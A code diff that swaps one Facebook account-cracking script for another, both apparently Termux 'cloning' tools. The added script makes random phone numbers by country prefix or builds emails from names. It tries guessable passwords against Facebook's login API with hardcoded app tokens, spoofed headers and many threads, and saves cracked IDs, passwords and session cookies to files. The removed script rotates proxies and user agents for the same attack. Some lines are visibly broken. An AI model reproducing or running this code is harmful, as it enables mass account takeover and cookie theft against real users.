@@ -1,532 +1,289 @@
-#GITHUB-SHANTO-KING
-#ACTIVE FILE CLONING
-#ONLY ACTIVE ACCOUNT FOR GAME ACCOUNT USE FILE 10000 
-#DEC-FUCK-YOUR-MOM-DON'T-BYPASS-MY-COMMAND
-# =[â€¢]=[SCRIPT]=[ADMIN]=[SHANTO]=[â€¢]=
-#------------------[ Install-1 ]-------------------#
-import os 
-#-----------------[ SHANTO-King ]-------------------# 
-os.system("pkg install sox -y")
-os.system("play op.mp3")
-os.system("pkg install espeak")
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-import requests,zlib,platform
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-pretty.install()
-CON=sol()
-#------------------[ USER-AGENT ]-------------------#
-ua = ["Davik/2.1.0 (Linux; U; Android 12.0.1; Infinix X676C Build/SP1A.210812.016) [FBAN/FB4A;FBAV/148.0.0.94.498;FBBV/346484979;FBDM/{density=3.0,width=1080,height=2376};FBLC/en_GB;FBRV/47141262;FBCR/Zong;FBMF/INFINIX;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X676C;FBSV/12;FBOP/19;FBCA/arm64-v8a:armeabi-v7a:armeabi;]",]
-ugen2=[]
-ugen=[]
-cokbrut=[]
-ses=requests.Session()
-princp=[]
-try:
-	prox= requests.get('https://github.com/RJSHANTO-217/Api/blob/main/prox.txt').text
-	open('.prox.txt','w').write(prox)
-	
-except Exception as e:
-	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mSHANTO')
-prox=open('.prox.txt','r').read().splitlines()
-for xd in range(1000):
-	a='Mozilla/5.0 (Symbian/3; Series60/'
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d='Nokia'
-	e=random.randrange(1000, 9999)
-	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
-	g=random.randrange(1, 9)
-	h=random.randrange(1, 4)
-	i=random.randrange(1, 4)
-	j=random.randrange(1, 4)
-	k='Mobile Safari/535.1'
-	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen2.append(uaku)
- 
- 
-	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
-	b=random.choice(['6','7','8','9','10','11','12'])
-	c=' en-us; GT-'
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(1, 999)
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile/15E148 Safari/605.1'
-	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	ugen.append(uaku2)
+#!/usr/bin/python3
+#-*-coding:utf-8-*-
+#!/usr/bin/python3
+#create by tkm tonmoy 
+#wa.me/+8801766804626
+############------[ MODULES ]------#########
+import os,time,random,string,re,sys,json,uuid,requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+os.system('xdg-open https://github.com/tonmoy404-cyber')
+B = '\x1b[1;90m';R = '\x1b[1;91m';G = '\x1b[1;92m';H = '\x1b[1;93m';BL = '\x1b[1;94m';BG = '\x1b[1;95m';S = '\x1b[1;96m';W = '\x1b[1;97m';EX = '\x1b[0m';E = '\33[m'
+############------[ XXXX ]------#########
+lk=[];ok=[];cp=[];twf=[];lop=0;xode=[];plist=[];paxd=[];cpx=[];cokix=[];apkx=[];paswtrh = [];rcd=[];rcdx=[];mthx=[];ugnm=[];psd=[]
+version="1.09"
+def line():
+	print(f"{W}{40*'-'}{W}")
+############------[ RANDOM SYS ]------#########
+AFGX=f"{W}[{G}+{W}] AFG SIM CODE : {G}0780 0771 0799 0701{E}{W}";BDX=f"{W}{W}[{G}+{W}] BD SIM CODE: {G}017 015 018 019 013 016{E}{W}";INDX=f"{W}{W}[{G}+{W}] OTHER COUNTRY USER : {G}+91967 +91894{E}{W}\n{40*'-'}\n{W}{W}[{G}+{W}] IND SIM CODE : {G}967 783 894 879 638{E}{W}";PAKX=f"{W}{W}[{G}+{W}] PAK SIM CODE : {G}0306 0315 0335 0345{E}{W}";NEPX=f"{W}{W}[{G}+{W}] NEP SIM CODE : {G}9868 9865 9818 9817 9845{E}{W}";USEX=f"{W}{W}[{G}+{W}] USA SIM CODE : {G}941 816 308 225{E}{W}";NGRA=f"{W}{W}[{G}+{W}] NAGERIA SIM CODE:{G}070 080 081 090 091{E}{W}";LIMITX=f"{W}[{G}+{W}] EXAMPLE: {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}";NOSIMX=f'         {G}USE YOUR SIM CODE {W}\n{40*"-"}\n{G}\t    Last Range 7{W}'
+############------[ A SYS ]------#########
+CPG=f"[{G}+{W}] Do you went show cp account (y/n)";CKIG=f"[{G}+{W}] Do you went show cookie (y/n)";chc=f'{W}[{G}+{E}] Choice : {G}';flp=f"{W}[{G}•{W}] PUT FILE PATH\033[1;37m : {G}";chcps=f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}';mxxt=f'{W}[{G}A{W}] Method {G}1{W}\n{W}[{G}B{W}] Method {G}2{W}';nflp=f"[{R}!{W}] FILE LOCATION NOT FOUND ";FSNM=f"{W}EXAMPLE : {G}rakib{W},{G}sakib{W},{G}rabbi{W},{G}tanvir{W},{G}jahid{W}";LSNM=f"{W}EXAMPLE : {G}hosain{W},{G}mahmud{W},{G}islam{W},{G}ahmed{W},{G}khan{W}";GMLN=f"{W}EXAMPLE : {G}@gmail.com{W} , {G}@yahoo.com{W} {R}ETC{G}...{W}";EPS1=f'{W}Don\'t try : {G}123{W},{G}1234{W},{G}12345{W},{G}@@##{W},{G}@@@{W},{G}@@{W},{G}@{W} ';EPS2=f"{W}Try it : {G}1122{W},{G}@#{W},{G}##{W},{G}@@@@{W},{G}@123{W},{G}@12345{W},{G}11{W}";apsd=f"{W}[{G}A{W}] {W}AUTO PASSWORD {W}\n{W}[{G}B{W}]{W} CHOICE PASSWORD{W}"
+############------[ LOGO ]------#########
+def logo():
+	os.system('clear');print(f"""\r\r\x1b[1;97m{W}\n88888888888 888    d8P  888b     d888 \n    888     888   d8P   8888b   d8888{W} \n    888     888  d8P    88888b.d88888 \n    888     888d88K     888Y88888P888{W} \n    888     8888888b    888 Y888P 888 \n    888     888  Y88b   888  Y8P  888{W} \n    888     888   Y88b  888   "   888 \n    888     888    Y88b 888       888\n{40*"-"} \x1b[1;97m\n[{G}+{W}] GITHUB   : tonmoy404-cyber        \n[{G}+{W}] FACEBOOK : TONMOY X X X     {B}[{W}V{W}:{G}{version}{B}]{W}\n{40*"-"}\x1b[1;97m""")
+############------[ COUNTRY ]------#########
+def YF():
+	logo();print(f'{W}[{G}A{W}] FROM {G}BANGLADESH{W}');print(f'{W}[{G}B{W}] FROM {G}PAKISTAN{W}');print(f'{W}[{G}C{W}] FROM {G}INDIA{W}');print(f'{W}[{G}D{W}] FROM {G}AFGHANISTAN{W}');print(f'{W}[{G}E{W}] FROM {G}NEPAL{W}');print(f'{W}[{G}F{W}] FROM {G}UNITED STATES{W}');print(f'{W}[{G}G{W}] FROM {G}NIGERIA{W}');print(f'{W}[{G}H{W}] {W}MY {W}COUNTRY{R} IS {R}NOT HERE{W}');print(f"{W}[{G}I{W}] CONTACT {G}ADMIN{W}");line()
+	ghx=input(f'[{G}+{W}] Choice : {G}')
+	if ghx in ["A","a","1"]:rcd.append(f'1');Main()
+	elif ghx in ["B","b","2"]:rcd.append(f'2');Main()
+	elif ghx in ["C","c","3"]:rcd.append(f'3');Main()
+	elif ghx in ["D","d","4"]:rcd.append(f'4');Main()
+	elif ghx in ["E","e","5"]:rcd.append(f'5');Main()
+	elif ghx in ["F","f","6"]:rcd.append(f'6');Main()
+	elif ghx in ["G","g","7"]:rcd.append(f'7');Main()
+	elif ghx in ["H","h","8"]:rcd.append(f'8');Main()
+	elif ghx in ["I","i","9"]:cadmin()
+	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);YF()
+############------[ MENU ]------#########
+def Main():
+	logo();print(f'{W}[{G}A{W}] CRACK {G}FILE{W}');print(f'{W}[{G}B{W}] CRACK {G}RANDOM{W}');print(f'{W}[{G}C{W}] CRACK {G}GMAIL{W}');print(f'{W}[{G}D{W}] CRACK {G}USERNAME{W}');print(f'{W}[{G}E{W}] CRACK {G}GMAIL{H}+{G}USERNAME{W}');print(f"{W}[{G}F{W}] CONTACT {G}ADMIN{W}");print(f'{W}[{G}X{W}] {R}EXIT{W}')
+	line()
+	gh=input(f'[{G}+{W}] Choice : {G}')
+	if gh in ["A","a","1"]:menu1()
+	elif gh in ["B","b","2"]:rmenu1()
+	elif gh in ["C","c","3"]:ugnm.append(f'1');menu3()
+	elif gh in ["D","d","4"]:ugnm.append(f'2');menu3()
+	elif gh in ["E","e","5"]:ugnm.append(f'3');menu3()
+	elif gh in ["F","f","6"]:cadmin()
+	elif gh in ["X","x","7"]:YF()
+	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);Main()
+############------[CONTACT-ADMIN]-------#########
+def cadmin():
+	logo();print(f"[{G}A{W}] CONTACT {G}FACEBOOK{W}");print(f"[{G}B{W}] CONTACT {G}WHATSAPP{W}");print(f"[{G}C{W}] CONTACT {G}TELEGRAM{W}");print(f"[{G}D{W}] FOLLOW {G}GITHUB{W}");print(f"[{G}E{W}] GROUP {G}FACEBOOK{W}");print(f"[{G}F{W}] GROUP {G}MESSENGER{W}");print(f'[{G}X{W}] {R}EXIT{W}');line()
+	ghx=input(f"[{G}+{W}] Choice : {G}")
+	if ghx in ["A","a","1"]:os.system('xdg-open https://www.facebook.com/profile.php?id=100089388525050');time.sleep(2);cadmin()
+	elif ghx in ["B","b","2"]:os.system('xdg-open https://github.com/tonmoy404-cyber');time.sleep(2);cadmin()
+	elif ghx in ["C","c","3"]:os.system('xdg-open https://t.me/tonmoymahato');time.sleep(2);cadmin()
+	elif ghx in ["D","d","4"]:os.system('xdg-open https://github.com/tonmoy404-cyber');time.sleep(2);cadmin()
+	elif ghx in ["E","e","5"]:os.system('xdg-open https://facebook.com/groups/2470754783080486/');time.sleep(2);cadmin()
+	elif ghx in ["F","f","6"]:os.system('xdg-open https://m.me/j/AbZax-WxyuojLcak/');time.sleep(2);cadmin()
+	elif ghx in ["X","x","7"]:Main()
+	else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);cadmin()
+	############------[FILE SYSTEM]-------#########
+mxxxt=[]
+ixd=[]
+fil=[]
+def menu1():
+	os.system('xdg-open https://github.com/tonmoy404-cyber')
+	logo()
+	fl = input(f'{flp}')
+	try:fil = open(fl,'r').read().splitlines()
+	except FileNotFoundError:print(f"{W}{40*'-'}");print(f'{nflp}');time.sleep(1);menu1()
+	for xid in fil:
+		ixd.append(xid)
+	print(f"{W}{40*'-'}");print(f'{mxxt}');line()
+	mtx=input(f'{chc}')
+	if mtx in ['n','N','no','NO','2']:mxxxt.append(f'2')
+	else:mxxxt.append(f'1')
+	print(f"{W}{40*'-'}");print(f'{CKIG}');line()
+	ckiv=input(f'{chc}')
+	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
+	else:cokix.append(f'y')
+	try:
+		logo();print(f'\t\t{G}7 BEST{W}');print (40*"-")
+		psl = int(input(f'[{G}+{W}] Limit : {G}'))
+	except:psl=1
+	print(f"{W}{40*'-'}");print(f'{chcps}');print (40*"-")
+	for ox in range(psl):paxd.append(input(f'{W}[{G}{ox+1}{W}] Password : {G}'))
+	pswx(fil)
+def pswx(fil):
+	with ThreadPool(max_workers=30) as tonxoys:
+		tid = str(len(fil))
+		logo();print(f'{W}[{G}+{W}] TOTAL ID :\033[1;92m '+tid);print(f'{W}[{G}+{W}] FLIGHT MODE ON/OFF EVERY 3 MINUTES');print(40*"-")
+		#os.system('xdg-open https://facebook.com/groups/2470754783080486/')
+		for uuxxd in ixd:
+			id,name= uuxxd.split(f'|')
+			psdx=paxd
+			for pxxd in psdx:
+				fn = name.split(' ')[0]
+				try:ln = name.split(' ')[1]
+				except:ln = fn
+				psd = pxxd.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
+				if mxxxt in ["1","01","A","a"]:tonxoys.submit(graph,id,psd)
+				if mxxxt in ["2","02","B","b"]:tonxoys.submit(api,id,psd)
+############------[RANDOM]-------#########
+def rmenu1():
+	#os.system('xdg-open https://github.com/tonmoy404-cyber')
+	logo()
+	if "1" in rcd:print(f"{BDX}");line()
+	if "2" in rcd:print(f"{PAKX}");line()
+	if "3" in rcd:print(f"{INDX}");line()
+	if "4" in rcd:print(f"{AFGX}");line()
+	if "5" in rcd:print(f"{NEPX}");line()
+	elif "6" in rcd:print(f"{USEX}");line()
+	elif "7" in rcd:print(f"{NGRA}");line()
+	elif "8" in rcd:print(f"{NOSIMX}");line()
+	code=input(f'{chc}');print(f"{W}{40*'-'}")
+	print(f'{LIMITX}');line()
+	limit=int(input(f'[{G}+{E}] Limit : {G}'))
+	print(f"{W}{40*'-'}");print(f'{mxxt}');line()
+	mtx=input(f'{chc}')
+	print(f"{W}{40*'-'}");print(f'{CKIG}');line()
+	ckiv=input(f'{chc}')
+	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
+	else:cokix.append(f'y')
+	for number in range(limit):
+		if "1" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
+		if "2" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
+		if "3" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
+		if "4" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
+		if "5" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(6));xode.append(numberx)
+		elif "6" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
+		elif "7" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
+		elif "8" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
+	with ThreadPool(max_workers=60) as tonxoys:
+		tid= str(len(xode))
+		logo();print(f'{W}[{G}+{W}] TOTAL ID :\033[1;92m '+tid);print(f'{W}[{G}+{W}] FLIGHT MODE ON/OFF EVERY 3 MINUTES');line()
+		#os.system('xdg-open https://facebook.com/groups/2470754783080486/')
+		for rngx in xode:
+			name=f"{rngx}"
+			id=code+rngx
+			if "1" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[4:],id[5:]]
+			if "2" in rcd:psd=[id,rngx,"khan123","khan1122","khan12345"]
+			if "3" in rcd:psd=["57575751","57273200","59039200",id[4:],id[3:]]
+			if "4" in rcd:psd=[id,rngx,"200200","500500"]
+			if "5" in rcd:psd=[id,rngx,"FreeFire","freefire"]
+			elif "6" in rcd:psd=[id,rngx,"500500","200200"]
+			elif "7" in rcd:psd=[id,rngx,"500500","200200"]
+			elif "8" in rcd:psd=[id,rngx,"500500","200200"]
+			if mtx in ["1","01","A","a"]:tonxoys.submit(graph,id,psd,name)
+			if mtx in ["2","02","B","b"]:tonxoys.submit(api,id,psd,name)
+############------[GMAIL-USERNAME]-------#########
+def menu3():
+	#os.system('xdg-open https://github.com/tonmoy404-cyber')
+	logo()
+	print(f'{FSNM} ');line()
+	frs=input(f'{W}[{G}+{E}] Fast Name : {G}');print(f"{W}{40*'-'}")
+	print(f'{LSNM}');line()
+	lst=input(f'{W}[{G}+{E}] Last Name : {G}');print(f"{W}{40*'-'}");print(f'{LIMITX} ');line()
+	limit=int(input(f'[{G}+{E}] Limit : {G}'))
+	print(f"{W}{40*'-'}");print(f'{mxxt}');line()
+	mtx=input(f'{chc}')
+	print(f"{W}{40*'-'}");print(f'{CKIG}');line()
+	ckiv=input(f'{chc}')
+	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
+	else:cokix.append(f'y')
+	try:
+		logo();print(f'\t\t{G}7 BEST{W}');print (40*"-")
+		psl = int(input(f'[{G}+{W}] Password Limit : {G}'))
+	except:psl=1
+	print(f"{W}{40*'-'}");print(f'{chcps}');print (40*"-")
+	for ox in range(psl):paswtrh.append(input(f'{W}[{G}{ox+1}{W}] Password : {G}'))
+	lxtx = ['1','2','4','5','6','7','8','9']
+	for gmnu in range(limit):
+		lcxt = random.choice(lxtx)
+		if '1' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,2));xode.append(digx)
+		if '2' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,3));xode.append(digx)
+		if '4' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,5));xode.append(digx)
+		if '5' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,6));xode.append(digx)
+		if '6' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,7));xode.append(digx)
+		if '7' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,8));xode.append(digx)
+		if '8' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,9));xode.append(digx)
+		if '9' in lcxt:digx = ''.join(random.choice(string.digits) for _ in range(1,10));xode.append(digx)
+		else:digx = ''.join(random.choice(string.digits) for _ in range(1,4));xode.append(digx)
+	with ThreadPool(max_workers=30) as tonxoys:
+		tid= str(len(xode))
+		logo();print(f'{W}[{G}+{W}] TOTAL ID :\033[1;92m '+tid);print(f'{W}[{G}+{W}] FLIGHT MODE ON/OFF EVERY 3 MINUTES');line()
+		#os.system('xdg-open https://facebook.com/groups/2470754783080486/')
+		for rngx in xode:
+			name=frs+" "+lst
+			if "1" in ugnm:id=frs+lst+rngx+"@gmail.com"
+			if "2" in ugnm:id=random.choice([frs+lst+"."+rngx,frs+lst+rngx])
+			elif "3" in ugnm:id=random.choice([frs+lst+rngx,frs+lst+rngx+"@gmail.com"])
+			for thdhy in paswtrh:psd.append(thdhy)
+			if mtx in ["1","01","A","a"]:tonxoys.submit(graph,id,psd,name)
+			if mtx in ["2","02","B","b"]:tonxoys.submit(api,id,psd,name)
+############------[ USER-AGENT ]------#########
 
-for agent in range(random.randint(89999, 100000)):
-    a='Mozilla/5.0 (iPod/'
-    aa=random.choice(['7.1','8.0','9.2','10.3','11.4','12.5','13.2','14.7','15.1','16.0'])
-    a1='; CPU iPhone OS'
-    b=random.choice(['3_1','3_2','3_3','16_5','13_4','3_0','4_0','15_0','11_0','12_1','13_3','14_2'])
-    n='like Mac OS X)'
-    c=random.randrange(7,12)
-    m='en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(100,999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/'
-    o=random.randrange(533,605)
-    p='1'
-    q=random.randrange(10,99)
-    r='(KHTML, like Gecko) Chrome/'
-    h=random.randrange(10,99)
-    i='0'
-    j=random.randrange(1000,9999)
-    k=random.randrange(10,99)
-    l='GSA/'
-    ll=random.randrange(155,159)
-    l1=random.randrange(1,9)
-    l2=random.randrange(111111111,999999999)
-    l3='Mobile/'
-    l4=random.choice(['18C79','18B92','18A374','17D47','16E23','15F91','14G60','13H15','12I82','11J33','10K04','09L78'])
-    l5='Safari/'
-    s=random.randrange(535,605)
-    t=random.randrange(1,9)
-    fullagent=f'{a}{aa}{a1} {b} {n} {c};  {m}{d}{e}{f}) {g}{o}.{p}.{q} {r}{h}.{i}.{j}.{k} {l}{ll}.{l1}.{l2} {l3}{l4} {l5}{s}.{t}'
-    ugen.append(fullagent)
- 
-def uaku():
+############------[METHOD-1-A]-------#########
+def graph(id,psd):
 	try:
-		ua=open('bbnew.txt','r').read().splitlines()
-		for ub in ua:
-			ugen.append(ub)
-	except:
-		a=requests.get('https://github.com/RJ217/Ua.txt').text
-		ua=open('.bbnew.txt','w')
-		aa=re.findall('line">(.*?)<',str(a))
-		for un in aa:
-			ua.write(un+'\n')
-		ua=open('.bbnew.txt','r').read().splitlines()
-id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
-cokbrut=[]
- 
-def back():
-	login()
-SHANTO="SHANTO"
-imt="JENI"
-ak="awsome-"
- 
-P = '\x1b[1;97m'
-M = '\x1b[1;91m'
-H = '\x1b[1;92m'
-K = '\x1b[1;93m'
-B = '\x1b[1;94m'
-U = '\x1b[1;95m' 
-O = '\x1b[1;96m'
-N = '\x1b[0m'    
-Z = "\033[1;30m"
-sir = '\033[41m\x1b[1;97m'
-x = '\33[m' # DEFAULT
-m = '\x1b[1;91m' #RED +
-k = '\033[93m' # KUNING +
-h = '\x1b[1;92m' # HIJAU +
-hh = '\033[32m' # HIJAU -
-u = '\033[95m' # UNGU
-kk = '\033[33m' # KUNING -
-b = '\33[1;96m' # BIRU -
-p = '\x1b[0;34m' # BIRU +
-asu = random.choice([m,k,h,u,b])
- 
- 
-pwpluss,pwnya=[],[]
-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
-tgl = datetime.datetime.now().day
-bln = dic[(str(datetime.datetime.now().month))]
-thn = datetime.datetime.now().year
-okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
- 
-def alvino_xy(u):
-        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
-def SHANTOj(u):
-        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-def clear():
-	os.system('clear')
-def back():
-	login()
-	
-	import getpass
- 
-attemps = 0
- 
-while attemps < 12345677901:
-    username = input(' \033[0;92mEnter Username: ')
-    password = input(' \033[0;93mEnter Password: ')
- 
-    if username == 'r' and password == 'j':
-        print(' \033[0;92mYou Have Successfully Logged in.')
-        break
-    else:
-        print(' Incorrect Pass Please Trying ')
-        attemps += 1
-        continue
-os.system('clear')
-
-#------------------[ MAIN ]-----------------#
-
-def banner():
-	os.system("clear")
-	print (f"""
-\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
-\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
-\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
-                                                 
-\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SHANTO TOOLS               \033[;0m\033[1;91m\033[1;92m
-===============================================
-  Auther        :  RJ SHANTO
-  Facebook      :  SH AN TO 
-  TOOLS         :  PRIVATE
-  Version       :  V-2
-  WhatsApp      :  013108682**
-=============================================== \033[1;31m""")
-def login():
-	banner()
-	SHANTOj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
-	SHANTOj('\033[0;97m===============================================')
-	SHANTO= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
-	if SHANTO in ['m']:
-		public()
-	elif SHANTO in ['1']:
-		crack_file()
-	elif SHANTO in ['i','0i']:
-		result()
-	elif SHANTO in ['2','02']:
-		os.system('xdg-open https://wa.me/+8801302199806')
-	elif SHANTO in ['0']:
-		os.system('rm -rf .token.txt')
-		os.system('rm -rf .cookie.txt')
-		print('#DONE LOGOUT ')
-		exit()
-	else:
-		print('# SELECT CORRECTLY ')
-		back()
-def error():
-	print(f'{k}#TRY AGAIN {u}')
-	time.sleep(4)
-	back()
-	
-def result():
-	os.system('clear')
-	banner()
-	print(' 1. CP ACCOUNT ')
-	print(' 2. OK ACCOUNT')
-	print(' 0. EXIT	')
-	kz = input('\n Choose : ')
-	if kz in ['1','01']:
-		try:vin = os.listdir('CP')
-		except FileNotFoundError:
-			print(' File Not Found')
-			time.sleep(3)
-			back()
-		if len(vin)==0:
-			print('You Have No CP Results ')
-			time.sleep(2)
-			back()
-		else:
-			cih = 0
-			lol = {}
-			for isi in vin:
-				try:hem = open('CP/'+isi,'r').readlines()
-				except:continue
-				cih+=1
-				if cih<10:
-					nom = '0'+str(cih)
-					lol.update({str(cih):str(isi)})
-					lol.update({nom:str(isi)})
-					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
+		global ok,cp,twf,lop
+		sys.stdout.write(f'\r{W}[{G}TONMOY-M1{W}]{E}-{W}[{G}%s{W}]{E}-{W}[OK:{G}%s{W}]{E}\r'%(lop,len(ok)));sys.stdout.flush()
+		for pxw in psd:
+			psw = pxw
+			ua=ua1()
+			apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
+			app = random.choice(apk)
+			random_seed = random.Random()
+			url = 'https://b-graph.facebook.com/auth/login'
+			datax={'adid': uuid.uuid4(),'format': 'json','device_id': uuid.uuid4(),'email': id, 'password': psw,'generate_analytics_claims': '1','community_id': '', 'cpl': 'true','try_num': '1','family_device_id': uuid.uuid4(),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US"','client_country_code': 'US','fb_api_req_friendly_name': 'authenticate','api_key': '882a8490361da98702bf97a021ddc14d','access_token': app}
+			headerx= {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": "[FBAN/EMA;FBLC/en_US;FBAV/540.602.473.468;FBBV/705748034;FBDV/A7;FBMD/oppo;FBSN/82.0.0.1825;FBPN/com.facebook.orca]","X-FB-Net-HNI": str(random.randint(2e4,4e4)),"X-FB-SIM-HNI": str(random.randint(2e4,4e4)),"X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
+			twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+			logx= requests.post(url,data=datax,headers=headerx).json()
+			if 'session_key' in logx:
+				try:iid = str(logx['uid'])
+				except:iid=id
+				coki=f"xr={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(logx)["session_cookies"])
+				check = requests.get(f"xd").text
+				if 'LIVE' in check:
+					print(f'\r\r{G}[TONMOY-OK] '+iid+' | '+psw+f'{W}')
+					ok.append(id)
+					open('/sdcard/TKM/OK-UID.txt', 'a').write(iid+' | '+psw+"\n");open('/sdcard/TKM/OK-NUMBER.txt', 'a').write(id+"\n");open('/sdcard/TKM/OK-COOKIE.txt', 'a').write(iid+'  ------------>>>'+coki+"\n")
+					break
 				else:
-					lol.update({str(cih):str(isi)})
-					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
-			geeh = input('\n   Choose : ')
-			try:geh = lol[geeh]
-			except KeyError:
-				print(' CHOOSE RIGHT OPTION ')
-				exit()
-			try:lin = open('CP/'+geh,'r').read().splitlines()
-			except:
-				print('FILE NOT FOUND ')
-				time.sleep(2)
-				back()
-			nocp=0
-			for cpku in range(len(lin)):
-				cpkuni=lin[nocp].split('|')
-				cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}'
-				sol().print(cpkuh,style="yellow")
-				nocp +=1
-			input('[ Click Enter ]')
-			back()
-	elif kz in ['2','02']:
-		try:vin = os.listdir('OK')
-		except FileNotFoundError:
-			print('File Not Found ')
-			time.sleep(2)
-			back()
-		if len(vin)==0:
-			print(' No OK FILE HERE ')
-			time.sleep(2)
-			back()
-		else:
-			cih = 0
-			lol = {}
-			for isi in vin:
-				try:hem = open('OK/'+isi,'r').readlines()
-				except:continue
-				cih+=1
